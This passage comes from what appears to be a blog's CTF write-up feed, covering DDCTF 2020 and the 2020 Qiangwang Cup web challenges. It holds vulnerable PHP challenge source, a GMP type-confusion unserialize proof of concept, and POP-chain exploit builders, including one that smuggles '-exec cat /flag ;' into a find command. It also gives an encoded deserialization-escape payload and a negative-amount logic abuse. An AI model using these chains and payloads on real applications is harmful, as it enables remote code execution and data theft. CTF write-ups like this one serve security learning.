class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $kw0ng;</span><br><span class="line">    <span class="keyword">var</span> $flag;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;kw0ng = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> system(<span class="string">&#x27;find /FlagNeverFall &#x27;</span> . escapeshellcmd(<span class="keyword">$this</span>-&gt;flag));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Prompter</span></span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">protected</span>  $hint;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params">$value</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|zlib|zip|bzip2|data|glob|phar|ssh2|rar|ogg|expect|\.\.|\.\//i&quot;</span>, <span class="keyword">$this</span>-&gt;hint))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Don&#x27;t Do That!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;execute(<span class="keyword">$this</span>-&gt;hint);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Display</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $contents;</span><br><span class="line">    <span class="keyword">public</span> $page;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file=<span class="string">&#x27;/hint/hint.php&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;contents = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Welcome to DDCTF 2020, Have fun!&lt;br/&gt;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;contents();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;page-&gt;contents = <span class="string">&quot;POP me! I can give you some hints!&quot;</span>;</span><br><span class="line">        <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;page-&gt;cont);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Repeater</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $cont;</span><br><span class="line">    <span class="keyword">public</span> $content;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unset</span>(<span class="params">$key</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $func = <span class="keyword">$this</span>-&gt;content;</span><br><span class="line">        <span class="keyword">return</span> $func();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$show = <span class="keyword">new</span> Display();</span><br><span class="line">$bullet = $_GET[<span class="string">&#x27;bullet&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($bullet))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Give Me Something!&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($bullet == <span class="string">&#x27;phpinfo&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    $infos = <span class="keyword">new</span> Info();</span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    $obstacle = <span class="keyword">new</span> <span class="built_in">stdClass</span>;</span><br><span class="line">    $mc = <span class="keyword">new</span> MyClass();</span><br><span class="line">    $mc-&gt;flag = <span class="string">&quot;MyClass&#x27;s flag said, Overwrite Me If You Can!&quot;</span>;</span><br><span class="line">    @unserialize($bullet);</span><br><span class="line">    <span class="keyword">echo</span> $mc-&gt;get_flag();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>访问<code>/hint/hint.php</code>提示和GMP扩展相关，搜了搜发现是GMP扩展反序列化类型混淆漏洞：<a href="https://hackerone.com/reports/198734">https://hackerone.com/reports/198734</a></p><p>测试去除<code>$obstacle = new stdClass;</code>可以替换参数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $kw0ng;</span><br><span class="line">    <span class="keyword">var</span> $flag;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;kw0ng = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;flag.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// $obstacle = new stdClass;</span></span><br><span class="line">$mc = <span class="keyword">new</span> MyClass();</span><br><span class="line">$mc-&gt;flag = <span class="string">&quot;id&quot;</span>;</span><br><span class="line">$inner = <span class="string">&#x27;s:1:&quot;1&quot;;a:2:&#123;s:4:&quot;flag&quot;;s:6:&quot;whoami&quot;;i:0;O:7:&quot;MyClass&quot;:1:&#123;s:5:&quot;kw0ng&quot;;R:2;&#125;&#125;&#x27;</span>;</span><br><span class="line">$exp = <span class="string">&#x27;a:1:&#123;i:0;C:3:&quot;GMP&quot;:&#x27;</span>.strlen($inner).<span class="string">&#x27;:&#123;&#x27;</span>.$inner.<span class="string">&#x27;&#125;&#125;&#x27;</span>;</span><br><span class="line"><span class="comment">// echo urlencode($exp);</span></span><br><span class="line">@unserialize($exp);</span><br><span class="line">$mc-&gt;get_flag();</span><br><span class="line"><span class="comment">// var_dump($obstacle);</span></span><br></pre></td></tr></table></figure><p>构造POP链：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Prompter</span></span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">protected</span>  $hint;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;hint = <span class="string">&#x27;EOf9uk3nSsVFK1LQ.php&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Display</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $contents;</span><br><span class="line">    <span class="keyword">public</span> $page;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;page = <span class="keyword">new</span> Repeater();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Repeater</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $cont;</span><br><span class="line">    <span class="keyword">public</span> $content;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="keyword">new</span> Prompter();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> Display();</span><br><span class="line">$b=serialize($a);</span><br><span class="line"><span class="keyword">echo</span> urlencode($b);</span><br></pre></td></tr></table></figure><p>可以文件包含，但从phpinfo有<code>open_basedir</code>限制，向页面POST上传文件无响应</p><p>后来才知道，原来是可以任意类的任意函数执行的，漏洞点就在于：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unset</span>(<span class="params">$key</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $func = <span class="keyword">$this</span>-&gt;content;</span><br><span class="line">    <span class="keyword">return</span> $func();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>$func()</code>那里，如果可控的话，可以任意类中的方法调用的，看一个例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">T</span></span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="number">456</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test1</span>(<span class="params">$a</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> $a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">array</span>(<span class="keyword">new</span> T,<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line">$a();</span><br><span class="line"></span><br><span class="line">$b = <span class="keyword">array</span>(<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;Test&#x27;</span>);</span><br><span class="line">$b();</span><br><span class="line"></span><br><span class="line">$c = <span class="keyword">array</span>(<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;test1&#x27;</span>);</span><br><span class="line">$c(<span class="string">&#x27;456&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 上面三个例子均会输出456</span></span><br></pre></td></tr></table></figure><p>由此，pop链可以为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $kw0ng;</span><br><span class="line">    <span class="keyword">var</span> $flag;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;flag = <span class="string">&#x27;-exec cat /flag ;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;kw0ng = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Display</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $contents;</span><br><span class="line">    <span class="keyword">public</span> $page;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;page = <span class="keyword">new</span> Repeater();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Repeater</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $cont;</span><br><span class="line">    <span class="keyword">public</span> $content;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="keyword">array</span>(<span class="keyword">new</span> MyClass(),<span class="string">&#x27;get_flag&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> Display();</span><br><span class="line">$b=serialize($a);</span><br><span class="line"><span class="keyword">echo</span> urlencode($b);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> writeup </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>强网杯2020部分题目writeup</title>
      <link href="2020/08/26/%E5%BC%BA%E7%BD%91%E6%9D%AF2020-wp/"/>
      <url>2020/08/26/%E5%BC%BA%E7%BD%91%E6%9D%AF2020-wp/</url>
      
        <content type="html"><![CDATA[<p>不愧是河南举办的最好的比赛！</p><a id="more"></a><h3 id="web辅助"><a href="#web辅助" class="headerlink" title="web辅助"></a>web辅助</h3><p>给了附件，下载下来，审下源码，发现是反序列化字符逃逸，和2020安恒四月赛很像，但是增加了<code>name</code>关键字过滤,可以用<code>S</code>绕过，<code>__weakup</code>改下属性数量绕过</p><p>正常序列化,<code>0x00</code>用<code>0</code>代替：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">player</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $user;</span><br><span class="line">    <span class="keyword">protected</span> $pass;</span><br><span class="line">    <span class="keyword">protected</span> $admin;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;user = <span class="string">&#x27;test&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;pass = <span class="string">&#x27;test&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;admin = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$a=serialize(<span class="keyword">new</span> player());</span><br><span class="line"><span class="keyword">echo</span> str_replace(chr(<span class="number">0</span>),<span class="string">&#x27;0&#x27;</span>,$a);</span><br><span class="line"></span><br><span class="line"><span class="comment">// O:6:&quot;player&quot;:3:&#123;s:7:&quot;0*0user&quot;;s:4:&quot;test&quot;;s:7:&quot;0*0pass&quot;;s:4:&quot;test&quot;;s:8:&quot;0*0admin&quot;;i:1;&#125;</span></span><br></pre></td></tr></table></figure><p>访问<code>play.php</code>会反序列化，pop链：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">topsolo::__destruct() &#x3D;&#x3D;&gt; TP() &#x3D;&#x3D;&gt; $name() &#x3D;&#x3D;&gt; midsolo::__invoke() &#x3D;&#x3D;&gt; Gank() &#x3D;&#x3D;&gt; stristr &#x3D;&#x3D;&gt; jungle::__toString() &#x3D;&#x3D;&gt; KS()</span><br></pre></td></tr></table></figure><p>构造exp，有两处需要绕过:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">player</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $user;</span><br><span class="line">    <span class="keyword">protected</span> $pass;</span><br><span class="line">    <span class="keyword">protected</span> $admin;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;user = <span class="string">&#x27;test&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;pass = <span class="keyword">new</span> topsolo();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;admin = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">topsolo</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="keyword">new</span> midsolo();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">midsolo</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="keyword">new</span> jungle();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">jungle</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $name = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a=<span class="keyword">new</span> player();</span><br><span class="line">$b=serialize($a);</span><br><span class="line">$c=str_replace(<span class="string">&#x27;test&quot;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,stristr($b,<span class="string">&#x27;test&quot;&#x27;</span>));</span><br><span class="line"></span><br><span class="line">$d=str_replace(<span class="string">&#x27;s:7:&quot;&#x27;</span>.chr(<span class="number">0</span>).<span class="string">&#x27;*&#x27;</span>.chr(<span class="number">0</span>).<span class="string">&#x27;name&quot;&#x27;</span>,<span class="string">&#x27;S:7:&quot;\00\2a\00\6e\61\6d\65&quot;&#x27;</span>,$c); <span class="comment">// 绕过check函数</span></span><br><span class="line">$d=str_replace(<span class="string">&#x27;&quot;midsolo&quot;:1:&#x27;</span>,<span class="string">&#x27;&quot;midsolo&quot;:2:&#x27;</span>,$d); <span class="comment">// 绕过__weakup</span></span><br><span class="line"><span class="keyword">echo</span> urlencode($d);</span><br></pre></td></tr></table></figure><p>接着再看需要多少个<code>\0*\0</code>，上面序列化之后<code>$pass</code>的长度是三位，所以要吃掉的就是，这里<code>0x00</code>替换成<code>0</code>，长度为22：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;;s:7:&quot;0*0pass&quot;;s:XXX:</span><br></pre></td></tr></table></figure><p>列方程：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5n&#x3D;3n+22+k</span><br></pre></td></tr></table></figure><p>n=11,k=0刚好可以，因此构造payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username&#x3D;\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0&amp;password&#x3D;%3Bs%3A7%3A%22%00%2A%00pass%22%3BO%3A7%3A%22topsolo%22%3A1%3A%7BS%3A7%3A%22%5C00%5C2a%5C00%5C6e%5C61%5C6d%5C65%22%3BO%3A7%3A%22midsolo%22%3A2%3A%7BS%3A7%3A%22%5C00%5C2a%5C00%5C6e%5C61%5C6d%5C65%22%3BO%3A6%3A%22jungle%22%3A1%3A%7BS%3A7%3A%22%5C00%5C2a%5C00%5C6e%5C61%5C6d%5C65%22%3Bs%3A0%3A%22%22%3B%7D%7D%7Ds%3A8%3A%22%00%2A%00admin%22%3Bi%3A1%3B%7D</span><br></pre></td></tr></table></figure><p>然后请求<code>play.php</code>即可得到flag</p><h3 id="bank"><a href="#bank" class="headerlink" title="bank"></a>bank</h3><p>nc连接发现是这样的形式，让我们爆破前三位</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sha256(XXX+rN3KgrFumXZ3gkHew) &#x3D;&#x3D; 9fd1a6531ed24bb86eef93614c0a34bcd64cc0819b976b8e55bd04d5951f7bbc</span><br></pre></td></tr></table></figure><p>直接hashcat掩码爆破</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat64.exe -a 3 -m 1400 9fd1a6531ed24bb86eef93614c0a34bcd64cc0819b976b8e55bd04d5951f7bbc ?a?a?arN3KgrFumXZ3gkHew</span><br></pre></td></tr></table></figure><p><img src="/2020/08/26/%E5%BC%BA%E7%BD%91%E6%9D%AF2020-wp/QQ%E6%88%AA%E5%9B%BE20200824161459.png"></p><p>测试一遍之后发现代码存在漏洞，直接交易的时候输负数就能增加cash </p><p><img src="/2020/08/26/%E5%BC%BA%E7%BD%91%E6%9D%AF2020-wp/QQ%E6%88%AA%E5%9B%BE20200824161907.png"></p><h3 id="Funhash"><a href="#Funhash" class="headerlink" title="Funhash"></a>Funhash</h3><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 